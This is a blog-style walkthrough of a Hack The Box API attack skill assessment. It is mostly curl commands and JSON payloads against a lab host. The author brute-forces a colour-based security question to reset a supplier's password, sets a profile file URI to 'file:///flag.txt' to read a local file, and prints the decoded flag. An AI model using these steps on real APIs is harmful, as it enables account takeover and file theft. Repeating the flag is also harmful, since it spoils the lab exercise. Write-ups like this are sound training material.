---
title: API Attack Skill Assessment
published: 2025-12-30
description: 'this is my write-up'
image: 'guide/aabackground.jpg'
tags: [api,HTB,write-up]
category: 'learning'
draft: false 
lang: 'en'
---

Hi there im back again with api attack skill-assessment 

Alright nothing else to say let’s dive into the world  of `API`

## Playing around

![image.png](guide/aa1.png)

Always needing an account for testing, the lab provided me the credentials of user `"htbpentester@hackthebox.com"` and password`"HTBPentester"`

```python
──(kali㉿kali)-[~]
└─$ curl -X 'POST' \
  'http://94.237.120.119:39191/api/v2/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester@hackthebox.com",
  "Password": "HTBPentester"
}'

```

```python
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll"
  ]
}
```

With those roles i can go to  /api/v2/suppliers  and get the information of all suppliers

![image.png](guide/aa2.png)

## Suppliers attack

Im pretty sure this is **Unrestricted Access to Sensitive Business Flows**

![image.png](guide/aa3.png)

```python
P.Howard1536@globalsolutions.com
L.Walker1872@globalsolutions.com
T.Harris1814@globalsolutions.com
B.Rogers1535@globalsolutions.com
M.Alexander1650@globalsolutions.com
```

Here i list all supplier with security question is `"What is your favorite color?”`

with using most common colors list to bruteforce 

- Color list
    
    ```python collapse={1-78 ,80-85}
    Black
    White
    Red
    Blue
    Green
    Yellow
    Orange
    Purple
    Pink
    Brown
    Gray
    Grey
    Cyan
    Magenta
    Teal
    Navy
    Maroon
    Olive
    Lime
    Aqua
    Turquoise
    Gold
    Silver
    Beige
    Ivory
    Tan
    Coral
    Salmon
    Khaki
    Lavender
    Violet
    Indigo
    Plum
    Mint
    Peach
    Apricot
    Cream
    Charcoal
    Crimson
    Scarlet
    Amber
    Bronze
    Copper
    Emerald
    Jade
    Ruby
    Sapphire
    Periwinkle
    Aquamarine
    Azure
    Chartreuse
    Orchid
    Fuchsia
    Chocolate
    Coffee
    Mocha
    Caramel
    Sand
    Stone
    Slate
    Steel
    Smoke
    Ash
    Snow
    Ice
    Sky
    Ocean
    Forest
    Grass
    Leaf
    Rose
    Blush
    Wine
    Burgundy
    Mustard
    Sunflower
    Lemon
    Pumpkin
    Rust
    Clay
    Earth
    Midnight
    Shadow
    Pearl
    Opal
    
    ```
    

![image.png](guide/aa4.png)

![image.png](guide/aa5.png)

```python
{
  "SupplierEmail": "B.Rogers1535@globalsolutions.com",
  "SecurityQuestionAnswer": "Rust",
  "NewPassword": "newpassword"
}
```

With that credential now i can login with this curl and get jwt 

```python
curl -X 'POST' \
  'http://94.237.120.119:39191/api/v2/authentication/suppliers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "B.Rogers1535@globalsolutions.com",
  "Password": "newpassword"
}'
```

`B.Rogers1535` role:

```python
{
  "errorMessage": "User does not have any roles assigned"
}
```

Some information about the current supplier

```python
{
  "supplierCompany": {
    "id": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "name": "Global Solutions",
    "email": "supplier@globalsolutions.com"
  }
}
```

## CV upload attack

Found that i can upload a `cvpdf`file here 

![image.png](guide/aa6.png)

![image.png](guide/aa7.png)

Then i go to here for changing file URI to /flag.txt with SSRF vuln to extract flag

![image.png](guide/aa8.png)

```python
curl -X 'PATCH' \
  'http://94.237.120.119:39191/api/v2/suppliers/current-user' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IkIuUm9nZXJzMTUzNUBnbG9iYWxzb2x1dGlvbnMuY29tIiwiZXhwIjoxNzY3MDcxMzI1LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.8ctjuix7Iu_NR6_l2YN8tuz0oanNNrF6WJxCRGmP3di2TpFFV98CYHK_Slri7ThznTX6pbXZVtcw2h1E2Up_Jw' \
  -H 'Content-Type: application/json' \
  -d '{
  "SecurityQuestion": "WHere gf",
  "SecurityQuestionAnswer": "none",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "newpassword",
  "Password": "newpassword"
}'
```

Finally with GET Supplier’s cv give you the content of flag.txt in base64 encode

![image.png](guide/aa9.png)

```python
┌──(kali㉿kali)-[~]
└─$ echo SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo= | base64 -d
HTB{f190b80cd543a84b236e92a07a9d8d59}
```

Flag : `HTB{f190b80cd543a84b236e92a07a9d8d59}`